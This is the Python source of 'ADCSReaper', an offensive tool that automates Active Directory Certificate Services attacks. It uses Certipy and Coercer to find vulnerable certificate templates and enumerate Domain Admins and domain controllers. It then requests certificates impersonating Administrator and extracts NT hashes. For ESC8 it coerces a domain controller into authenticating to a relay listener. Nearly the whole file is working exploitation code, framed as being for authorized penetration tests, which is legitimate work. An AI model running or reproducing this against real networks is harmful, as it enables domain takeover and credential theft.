#!/usr/bin/env python3
"""
ADCSReaper - Automated detection & exploitation of ADCS vulnerabilities
Author: G0urmetD
Version: 1.0
License: MIT
Notes:
    - Use this tool only in authorized penetration tests.
    - Uses Certipy & Coercer for analysis and optional exploitation.
"""

import os
import re
import sys
import json
import time
import ldap3
import shutil
import argparse
import datetime
import threading
import logging
import subprocess
from logging.handlers import RotatingFileHandler

# === Version ===
__version__ = "1.0"
__author__ = "G0urmetD"
__license__ = "MIT"

# === Colors & Logging ===
DEBUG = False
logger = logging.getLogger("adcsreaper")

class ColorFormatter(logging.Formatter):
    COLORS = {
        "DEBUG": "\033[95m",
        "INFO": "\033[94m",
        "WARNING": "\033[93m",
        "ERROR": "\033[91m",
        "CRITICAL": "\033[91m"
    }
    RESET = "\033[0m"

    def format(self, record):
        color = self.COLORS.get(record.levelname, "")
        message = super().format(record)
        return f"{color}[{record.levelname}]{self.RESET} {message}"

def setup_logging():
    log_dir = "/var/log/adcsreaper"
    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, "adcsreaper.log")

    logger.setLevel(logging.DEBUG)
    fh = RotatingFileHandler(log_file, maxBytes=5*1024*1024, backupCount=3)
    fh.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

    sh = logging.StreamHandler(sys.stdout)
    sh.setFormatter(ColorFormatter('%(message)s'))

    logger.addHandler(fh)
    logger.addHandler(sh)
    return log_file

def log_info(msg):
    logger.info(msg)

def log_warn(msg):
    logger.warning(msg)

def log_error(msg):
    logger.error(msg)
    sys.exit(1)

def log_debug(msg):
    if DEBUG:
        logger.debug(msg)

def check_dependencies():
    for tool in ["certipy", "Coercer"]:
        if shutil.which(tool) is None:
            log_error(f"Required tool '{tool}' not found in PATH. See https://github.com/G0urmetD/adcsreaper/wiki for installation instructions")

def validate_inputs(args):
    if args.esc == "esc8" and not args.lhost:
        log_error("ESC8 exploitation requires -lhost to be set")

    if args.target_user:
        if not re.match(r"^[\w.-]+(@[\w.-]+)?$", args.target_user):
            log_warn(f"Target user '{args.target_user}' does not match typical format. Continuing...")

def check_pfx_file(path):
    if not os.path.exists(path):
        log_warn(f"Missing PFX file: {path}")
        return False
    if not os.access(path, os.R_OK):
        log_warn(f"PFX file not readable: {path}")
        return False
    return True

# === ASCII Banner ===
def print_banner():
    banner = r"""

 ▄▄▄      ▓█████▄  ▄████▄    ██████  ██▀███  ▓█████ ▄▄▄       ██▓███  ▓█████  ██▀███
▒████▄    ▒██▀ ██▌▒██▀ ▀█  ▒██    ▒ ▓██ ▒ ██▒▓█   ▀▒████▄    ▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒
▒██  ▀█▄  ░██   █▌▒▓█    ▄ ░ ▓██▄   ▓██ ░▄█ ▒▒███  ▒██  ▀█▄  ▓██░ ██▓▒▒███   ▓██ ░▄█ ▒
░██▄▄▄▄██ ░▓█▄   ▌▒▓▓▄ ▄██▒  ▒   ██▒▒██▀▀█▄  ▒▓█  ▄░██▄▄▄▄██ ▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄
 ▓█   ▓██▒░▒████▓ ▒ ▓███▀ ░▒██████▒▒░██▓ ▒██▒░▒████▒▓█   ▓██▒▒██▒ ░  ░░▒████▒░██▓ ▒██▒
 ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ░▒ ▒  ░▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░░ ▒░ ░▒▒   ▓▒█░▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
  ▒   ▒▒ ░ ░ ▒  ▒   ░  ▒   ░ ░▒  ░ ░  ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░
  ░   ▒    ░ ░  ░ ░        ░  ░  ░    ░░   ░    ░    ░   ▒   ░░          ░     ░░   ░
      ░  ░   ░    ░ ░            ░     ░        ░  ░     ░  ░            ░  ░   ░
           ░      ░

    """
    print(banner)

# === Argument Parsing ===
def parse_args():
    parser = argparse.ArgumentParser(description="ADCSReaper - Automated ADCS exploitation tool")
    parser.add_argument("-domain", required=True, help="Target domain (FQDN)")
    parser.add_argument("-username", required=True, help="Username")
    parser.add_argument("-password", required=True, help="Password")
    parser.add_argument("-dc-ip", required=True, help="IP address of the Domain Controller")
    parser.add_argument("-lhost", help="Listener address (required for ESC8 exploit)")
    parser.add_argument("-detect", action="store_true", help="Run detection steps (1-5)")
    parser.add_argument("-exploit", action="store_true", help="Run full exploitation (1-9)")
    parser.add_argument("-esc", choices=["esc1", "esc3", "esc4," "esc8"], required="-exploit" in sys.argv, help="Specify which ESC technique to exploit")
    parser.add_argument("-target-user", help="User to impersonate during exploitation (default: Administrator)")
    parser.add_argument("-debug", action="store_true", help="Enable debug output")
    return parser.parse_args()

# === CertipyFinder ===
class CertipyFinder:
    def __init__(self, domain, username, password, dc_ip):
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip
        self.output_prefix = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
        self.json_path = f"{self.output_prefix}_Certipy.json"

    def run(self):
        cmd = [
            "certipy", "find",
            "-u", f"{self.username}@{self.domain}",
            "-p", self.password,
            "-dc-ip", self.dc_ip,
            "-vulnerable", "-json",
            "-output", self.output_prefix
        ]
        log_info("Running Certipy to find vulnerable certificate templates")
        log_debug(f"Command: {' '.join(cmd)}")

        result = subprocess.run(cmd, capture_output=True, text=True)

        if "socket connection error" in result.stdout:
            log_warn("Timeout detected. Retrying with increased timeout...")
            cmd.extend(["-timeout", "100"])
            result = subprocess.run(cmd, capture_output=True, text=True)

        if "Invalid credentials" in result.stdout:
            log_error("Invalid credentials provided to Certipy")

        if os.path.exists(self.json_path):
            log_info(f"Certipy output saved: {self.json_path}")
            return True, self.json_path
        else:
            log_error("Certipy did not produce output JSON")
            return False, None

    def parse_results(self):
        if not os.path.exists(self.json_path):
            log_error("Certipy JSON output file not found")

        with open(self.json_path, 'r') as file:
            try:
                data = json.load(file)
            except json.JSONDecodeError as e:
                log_error(f"Failed to parse Certipy JSON: {e}")

        esc_vulns = {"ESC1": [], "ESC3": [], "ESC4": []}
        ca_vulns = []

        try:
            ca_data = data["Certificate Authorities"]["0"]
            ca_name = ca_data["CA Name"]
            ca_dns = ca_data["DNS Name"]
            ca_env_vulns = ca_data.get("[!] Vulnerabilities", {})
            for esc in ["ESC8"]:
                if ca_env_vulns.get(esc):
                    ca_vulns.append(esc)
        except KeyError:
            log_warn("Could not extract CA info or environment vulnerabilities")
            return None

        try:
            templates = data.get("Certificate Templates", {})
            for tpl in templates.values():
                vulns = tpl.get("[!] Vulnerabilities", {})
                for esc in esc_vulns.keys():
                    if esc in vulns:
                        esc_vulns[esc].append(tpl.get("Template Name", "<unknown>"))
        except Exception as e:
            log_warn(f"Error parsing template vulnerabilities: {e}")

        for esc, templates in esc_vulns.items():
            if templates:
                log_info(f"{esc} vulnerable templates: {', '.join(templates)}")

        if ca_vulns:
            log_info(f"Environment vulnerabilities: {', '.join(ca_vulns)}")

        return {
            "ca_name": ca_name,
            "ca_dns": ca_dns,
            "esc_templates": esc_vulns,
            "ca_vulns": ca_vulns
        }

# === LDAPEnumerator ===
class LDAPEnumerator:
    def __init__(self, domain, username, password, dc_ip):
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip
        self.domain_sid = None
        self.admin_cn = None
        self.admins = []
        self.dcs = []
        self.conn = None

    def bind(self):
        domain_prefix = self.domain.split(".")[0]
        for scheme, port in [("ldap", 389), ("ldaps", 636)]:
            server = ldap3.Server(f"{scheme}://{self.dc_ip}:{port}", get_info=ldap3.ALL)
            try:
                self.conn = ldap3.Connection(server, user=f"{domain_prefix}\\{self.username}", password=self.password, auto_bind=True)
                log_info(f"Successfully bound to {scheme.upper()} on {self.dc_ip}:{port}")
                return True
            except ldap3.core.exceptions.LDAPException as e:
                log_warn(f"{scheme.upper()} bind failed: {e}")
        return False

    def get_domain_info(self):
        base_dn = ",".join([f"dc={part}" for part in self.domain.split(".")])

        try:
            # Domain SID
            self.conn.search(search_base=base_dn, search_filter='(objectClass=domain)', attributes=['objectSid'])
            self.domain_sid = self.conn.entries[0].objectSid.value
            log_info(f"Domain SID: {self.domain_sid}")

            # Admin Group CN
            admin_sid = f"{self.domain_sid}-512"
            self.conn.search(search_base=base_dn, search_filter=f"(objectSid={admin_sid})", attributes=['sAMAccountName'])
            self.admin_cn = self.conn.entries[0].sAMAccountName.value
            log_info(f"Admin group CN: {self.admin_cn}")

            # Members using direct 'member' attribute
            self.conn.search(
                search_base=base_dn,
                search_filter=f"(cn={self.admin_cn})",
                attributes=['member'],
                paged_size=100
            )
            members = self.conn.entries[0].member.values if hasattr(self.conn.entries[0], 'member') else []
            self.admins = [dn.split(",")[0].replace("CN=", "") for dn in members]
            log_info(f"Domain Admins ({len(self.admins)}): {', '.join(self.admins)}")

            # Domain Controllers
            self.conn.search(
                search_base=base_dn,
                search_filter='(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))',
                attributes=['dNSHostName']
            )
            for entry in self.conn.entries:
                self.dcs.append(entry.dNSHostName.value)
            log_info(f"Domain Controllers: {', '.join(self.dcs)}")

        except Exception as e:
            log_error(f"LDAP enumeration failed: {e}")

# === ESC1 Exploitation ===
class ExploitESC1:
    def __init__(self, domain, username, password, dc_ip, ca_name, templates, target_users):
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip
        self.ca_name = ca_name
        self.templates = templates
        self.target_users = target_users  # list of users

    def run(self):
        for user in self.target_users:
            for template in self.templates:
                pfx_file = f"{template}_{user}.pfx"
                log_info(f"[ESC1] Requesting certificate for user '{user}' using template '{template}'")

                # Check if old PFX already exists from earlier run (cleanup or skip if needed)
                if os.path.exists(pfx_file):
                    log_warn(f"[ESC1] Old PFX file exists and will be overwritten: {pfx_file}")

                # Step 1: Request cert
                cmd_req = [
                    "certipy", "req",
                    "-u", f"{self.username}@{self.domain}",
                    "-p", self.password,
                    "-target", self.dc_ip,
                    "-ca", self.ca_name,
                    "-template", template,
                    "-upn", user,
                    "-out", pfx_file.replace(".pfx", "")
                ]
                result = subprocess.run(cmd_req, capture_output=True, text=True)
                if "Got certificate" in result.stdout:
                    log_info(f"Received certificate: {pfx_file}")
                else:
                    log_warn(f"Certificate request failed for {user} / {template}")
                    continue

                if not check_pfx_file(pfx_file):
                    continue

                # Step 2: Use cert to authenticate
                log_info(f"Authenticating with certificate: {pfx_file}")
                cmd_auth = [
                    "certipy", "auth",
                    "-pfx", pfx_file,
                    "-domain", self.domain,
                    "-username", user,
                    "-dc-ip", self.dc_ip
                ]
                result_auth = subprocess.run(cmd_auth, capture_output=True, text=True)
                ntlm_line = next((line for line in result_auth.stdout.splitlines() if "Got hash for" in line), None)
                if ntlm_line:
                    ntlm_hash = ntlm_line.split(": ", 1)[-1]
                    log_info(f"[ESC1] NT Hash for {user}: {ntlm_hash}")
                else:
                    log_warn(f"[ESC1] No hash found in auth output for {user}")

# === ESC3 Exploitation ===
class ExploitESC3:
    def __init__(self, domain, username, password, dc_ip, ca_name, templates, target_users):
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip
        self.ca_name = ca_name
        self.templates = templates
        self.target_users = target_users  # list of users

    def run(self):
        for user in self.target_users:
            for template in self.templates:
                pfx_file = f"{template}_{user}.pfx"
                log_info(f"[ESC3] Requesting certificate for user '{user}' using template '{template}'")

                # Check if old PFX already exists from earlier run
                if os.path.exists(pfx_file):
                    log_warn(f"[ESC3] Old PFX file exists and will be overwritten: {pfx_file}")

                cmd_req = [
                    "certipy", "req",
                    "-u", f"{self.username}@{self.domain}",
                    "-p", self.password,
                    "-target", self.dc_ip,
                    "-ca", self.ca_name,
                    "-template", template,
                    "-upn", user,
                    "-out", pfx_file.replace(".pfx", "")
                ]
                result = subprocess.run(cmd_req, capture_output=True, text=True)
                if "Got certificate" in result.stdout:
                    log_info(f"Received certificate: {pfx_file}")
                else:
                    log_warn(f"Certificate request failed for {user} / {template}")
                    continue

                if not check_pfx_file(pfx_file):
                    continue

                log_info(f"Authenticating with certificate: {pfx_file}")
                cmd_auth = [
                    "certipy", "auth",
                    "-pfx", pfx_file,
                    "-domain", self.domain,
                    "-username", user,
                    "-dc-ip", self.dc_ip
                ]
                result_auth = subprocess.run(cmd_auth, capture_output=True, text=True)
                ntlm_line = next((line for line in result_auth.stdout.splitlines() if "Got hash for" in line), None)
                if ntlm_line:
                    ntlm_hash = ntlm_line.split(": ", 1)[-1]
                    log_info(f"[ESC3] NT Hash for {user}: {ntlm_hash}")
                else:
                    log_warn(f"[ESC3] No hash found in auth output for {user}")

# === ESC4 Exploitation ===
class ExploitESC4:
    def __init__(self, domain, dc_ip, ca_name, templates, target_users):
        self.domain = domain
        self.dc_ip = dc_ip
        self.ca_name = ca_name
        self.templates = templates
        self.target_users = target_users

    def run(self):
        for user in self.target_users:
            for template in self.templates:
                old_pfx = f"{template}_{user}.pfx"
                if not check_pfx_file(old_pfx):
                    continue

                new_output = f"{template}_{user}_renewed"
                log_info(f"[ESC4] Renewing certificate for '{user}' using template '{template}'")

                # Step 1: Renew certificate
                cmd_req = [
                    "certipy", "req",
                    "-pfx", old_pfx,
                    "-template", template,
                    "-ca", self.ca_name,
                    "-target", self.dc_ip,
                    "-out", new_output
                ]
                result = subprocess.run(cmd_req, capture_output=True, text=True)
                if "Got certificate" in result.stdout:
                    log_info(f"Renewed certificate saved: {new_output}.pfx")
                else:
                    log_warn(f"[ESC4] Certificate renewal failed for {user} / {template}")
                    continue

                # Step 2: Authenticate with renewed cert
                log_info(f"Authenticating with renewed certificate: {new_output}.pfx")
                cmd_auth = [
                    "certipy", "auth",
                    "-pfx", f"{new_output}.pfx",
                    "-domain", self.domain,
                    "-username", user,
                    "-dc-ip", self.dc_ip
                ]
                result_auth = subprocess.run(cmd_auth, capture_output=True, text=True)
                ntlm_line = next((line for line in result_auth.stdout.splitlines() if "Got hash for" in line), None)
                if ntlm_line:
                    ntlm_hash = ntlm_line.split(": ", 1)[-1]
                    log_info(f"[ESC4] NT Hash for {user}: {ntlm_hash}")
                else:
                    log_warn(f"[ESC4] No hash found after renewal for {user}")

# === ESC8 Exploitation ===
class ExploitESC8:
    def __init__(self, domain, username, password, dc_ip, ca_dns, dcs, lhost):
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip
        self.ca_dns = ca_dns
        self.dcs = dcs
        self.lhost = lhost

    def run(self):
        if not self.lhost:
            log_warn("[ESC8] lhost not set – skipping ESC8 exploitation")
            return

        if self.ca_dns not in self.dcs:
            # CA is not a DC → can use any DC as coercion target
            target_dc = self.dcs[0] if self.dcs else None
        else:
            # CA is also DC → need at least one other DC
            target_dc = next((dc for dc in self.dcs if dc != self.ca_dns), None)

        if not target_dc:
            log_warn("[ESC8] No suitable target DC found for coercion")
            return

        log_info(f"[ESC8] Starting Certipy relay against CA: {self.ca_dns}")
        relay_thread = threading.Thread(target=self.run_certipy_relay)
        relay_thread.start()

        log_info(f"[ESC8] Waiting 5 seconds for Certipy relay setup...")
        time.sleep(5)

        log_info(f"[ESC8] Triggering coercion from DC: {target_dc} to {self.lhost}")
        self.run_coercer(target_dc)

        relay_thread.join()
        log_info(f"[ESC8] Finished ESC8 exploitation attempt")

    def run_certipy_relay(self):
        cmd = ["certipy", "relay", "-ca", self.ca_dns, "-template", "DomainController"]
        log_debug(f"Relay command: {' '.join(cmd)}")
        subprocess.run(cmd)

    def run_coercer(self, target_dc):
        cmd = [
            "Coercer", "coerce",
            "-u", self.username,
            "-p", self.password,
            "-d", self.domain,
            "-t", target_dc,
            "-l", self.lhost,
            "--always-continue"
        ]
        log_debug(f"Coercer command: {' '.join(cmd)}")
        subprocess.run(cmd)

# === Main ===
def main():
    global DEBUG
    args = parse_args()
    DEBUG = args.debug

    results: dict | None = None
    ldap: LDAPEnumerator | None = None

    print_banner()
    log_file = setup_logging()
    log_debug(f"Logging to: {log_file}")

    check_dependencies()
    validate_inputs(args)

    if args.detect or args.exploit:
        certipy = CertipyFinder(args.domain, args.username, args.password, args.dc_ip)
        success, json_path = certipy.run()
        if not success:
            return
        results = certipy.parse_results()
        if not results:
            return

        ldap = LDAPEnumerator(args.domain, args.username, args.password, args.dc_ip)
        if not ldap.bind():
            return
        ldap.get_domain_info()

    if args.exploit:
        esc_type = args.esc

        if esc_type == "esc1":
            esc1_templates = results.get("esc_templates", {}).get("ESC1", [])
            if esc1_templates:
                log_info(f"[ESC1] Templates found: {', '.join(esc1_templates)}")
                targets = [args.target_user] if args.target_user else ["Administrator"]
                exploit = ExploitESC1(
                    domain=args.domain,
                    username=args.username,
                    password=args.password,
                    dc_ip=args.dc_ip,
                    ca_name=results["ca_name"],
                    templates=esc1_templates,
                    target_users=targets
                )
                exploit.run()
            else:
                log_warn("[ESC1] No ESC1 templates detected.")

        elif esc_type == "esc3":
            esc3_templates = results.get("esc_templates", {}).get("ESC3", [])
            if esc3_templates:
                log_info(f"[ESC3] Templates found: {', '.join(esc3_templates)}")
                targets = [args.target_user] if args.target_user else ["Administrator"]
                exploit = ExploitESC3(
                    domain=args.domain,
                    username=args.username,
                    password=args.password,
                    dc_ip=args.dc_ip,
                    ca_name=results["ca_name"],
                    templates=esc3_templates,
                    target_users=targets
                )
                exploit.run()
            else:
                log_warn("[ESC3] No ESC3 templates detected.")

        elif esc_type == "esc4":
                    esc4_templates = results.get("esc_templates", {}).get("ESC4", [])
                    if esc4_templates:
                        log_info(f"[ESC4] Templates found: {', '.join(esc4_templates)}")
                        targets = [args.target_user] if args.target_user else ["Administrator"]
                        exploit = ExploitESC4(
                            domain=args.domain,
                            dc_ip=args.dc_ip,
                            ca_name=results["ca_name"],
                            templates=esc4_templates,
                            target_users=targets
                        )
                        exploit.run()
                    else:
                        log_warn("[ESC4] No ESC4 templates detected.")

        elif esc_type == "esc8":
            ca_vulns = results.get("ca_vulns", [])
            if "ESC8" in ca_vulns:
                exploit = ExploitESC8(
                    domain=args.domain,
                    username=args.username,
                    password=args.password,
                    dc_ip=args.dc_ip,
                    ca_dns=results["ca_dns"],
                    dcs=ldap.dcs,
                    lhost=args.lhost
                )
                exploit.run()
            else:
                log_warn("[ESC8] CA is not vulnerable to ESC8.")

if __name__ == "__main__":
    main()
